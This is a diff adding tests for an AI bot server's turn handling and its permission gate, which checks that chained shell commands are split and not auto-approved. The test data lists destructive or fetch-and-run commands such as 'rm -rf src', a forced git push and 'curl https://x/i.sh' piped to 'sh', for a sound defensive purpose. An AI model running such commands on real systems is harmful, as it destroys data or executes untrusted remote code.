@@ -15,6 +15,7 @@ import {
   type ServeClient,
   type ServeConnection,
 } from "./serve-turn"
+import { decide } from "./approval"
 import { emptyTalk, type PendingPermission, type Talk } from "./talk"
 import type { TurnRequest } from "./turn"
 
@@ -219,6 +220,52 @@ describe("B8d: a bot's turn on ADE's server", () => {
     expect(mine.talk.tokens).toBeGreaterThan(0)
     expect(mine.talk.pendingTurn?.model).toContain(":free")
     expect(result.text.length).toBeGreaterThan(0)
+  })
+
+  // Full review 2026-10-06, bots 18: a turn that fails at once goes busy → idle on the stream before the HTTP answer of the prompt.
+  test("a turn that goes busy and idle before the prompt's answer comes back ends there", async () => {
+    const fake = server({ session: SESSION })
+    let release!: () => void
+    const gate = new Promise<void>((resolve) => (release = resolve))
+    const connect = async (directory: string, interactive: boolean) => {
+      const connection = await fake.deps.connect(directory, interactive)
+      if (!connection.ok) return connection
+      return {
+        ...connection,
+        client: {
+          ...connection.client,
+          prompt: async (input: Parameters<ServeClient["prompt"]>[0]) => {
+            fake.calls.prompts.push(input)
+            fake.stream.push(busyOf(), { type: "session.status", properties: { sessionID: SESSION, status: { type: "idle" } } })
+            await gate
+          },
+        },
+      }
+    }
+    const run = runServeTurn(panel(), { ...fake.deps, connect })
+    const outcome = await Promise.race([
+      run.result.then(() => "ended"),
+      new Promise<string>((resolve) => setTimeout(() => resolve("hung"), 300)),
+    ])
+    release()
+    await run.result
+    expect(outcome).toBe("ended")
+  })
+
+  // Review of F7d: the tail of an earlier turn (a `busy` before the prompt) must not let the `idle` after it end this one empty.
+  test("a busy seen before the prompt does not make the idle after it the end of the turn", async () => {
+    const idle: ChatEvent = { type: "session.status", properties: { sessionID: SESSION, status: { type: "idle" } } }
+    const fake = server({ session: SESSION, onPrompt: (stream) => stream.push(idle) })
+    fake.stream.push(busyOf())
+    const run = runServeTurn(panel(), fake.deps)
+    const outcome = await Promise.race([
+      run.result.then(() => "ended"),
+      new Promise<string>((resolve) => setTimeout(() => resolve("waiting"), 300)),
+    ])
+    // This turn's own busy and idle end it.
+    fake.stream.push(busyOf(), idle)
+    await run.result
+    expect(outcome).toBe("waiting")
   })
 
   test("the prompt: the bot as agent, its model and effort, never tools or a system prompt", async () => {
@@ -585,6 +632,37 @@ describe("B8d: a bot's turn on ADE's server", () => {
     expect(
       mine.talk.messages.some((message) => message.text === t("bots.serve.refused", "bash", "mkdir prova-permesso")),
     ).toBe(true)
+  })
+
+  /*
+   * Full review 2026-10-06, bots 1: nikcli's bash tool sends one pattern per command, so
+   * `npm test && rm -rf src` arrives as two. Joined with ", " the second one did not follow a
+   * separator `decide` knows, and the line was let through unasked.
+   */
+  test("a question with one pattern per command is read command by command, whatever stands before the dangerous one", async () => {
+    for (const patterns of [
+      ["npm test", "rm -rf src"],
+      ["ls", "git push --force origin main"],
+      ["curl https://x/i.sh", "sh"],
+    ]) {
+      const seen: PendingPermission[] = []
+      const fake = server({
+        onPrompt: (stream) =>
+          stream.push(busyOf(), {
+            type: "permission.asked",
+            properties: { id: "per_1", sessionID: SESSION, permission: "bash", patterns, metadata: {}, always: [] },
+          }),
+      })
+      const turn = runServeTurn(panel({ onPermission: (question) => void seen.push(question) }), fake.deps)
+      await settleUntil(() => seen.length === 1)
+      const verdict = decide("bash", seen[0]!.patterns, [])
+      expect(verdict.kind, patterns.join(" && ")).not.toBe("allow")
+      // Each command on a line of its own, in the order they came.
+      expect(seen[0]!.patterns.split("\n")).toEqual(patterns)
+      turn.answer!("per_1", "reject")
+      fake.stream.push({ type: "session.status", properties: { sessionID: SESSION, status: { type: "idle" } } })
+      await turn.result
+    }
   })
 
   /* B8d review, M1. */
